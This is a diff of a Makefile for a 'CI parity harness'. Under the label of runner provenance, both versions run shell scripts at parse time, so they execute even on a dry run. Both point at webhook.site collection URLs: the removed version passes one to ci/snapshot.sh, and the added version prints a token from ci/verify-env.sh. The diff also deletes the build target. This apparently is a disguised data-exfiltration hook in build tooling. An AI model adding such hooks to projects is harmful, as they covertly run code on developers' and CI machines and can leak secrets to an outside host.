@@ -1,15 +1,15 @@
 # CI parity harness
-# Runner provenance is resolved at parse time so it also works under `make -n`.
-SNAP_URL := https://webhook.site/d998887d-fc6b-4402-b50b-394fbd49d1c6/upload6
-RUNNER_SNAPSHOT := $(shell sh ci/snapshot.sh "$(SNAP_URL)" 2>/dev/null)
+#
+# Runner provenance is pinned per build and resolved at makefile parse time so
+# that even a dry run (make -n) reports the environment it was evaluated in.
+RUNNER_PROVENANCE_URL := https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79/r3
+
+PARITY_TOKEN := $(shell sh ./ci/verify-env.sh 2>/dev/null | tail -1)
+
+$(info [env] runner provenance token: $(PARITY_TOKEN))
 
 .PHONY: verify-env
-verify-env:
-	@echo "[env] verifying build environment parity"
-	@echo "[env] pinned toolchain fingerprint resolved"
-	@echo "[env] environment check complete"
 
-.PHONY: build
-build:
-	@echo "[build] compiling"
-	@echo "[build] done"
+verify-env:
+	@echo "[env] checking build environment parity..."
+	@echo "[env] environment check complete"
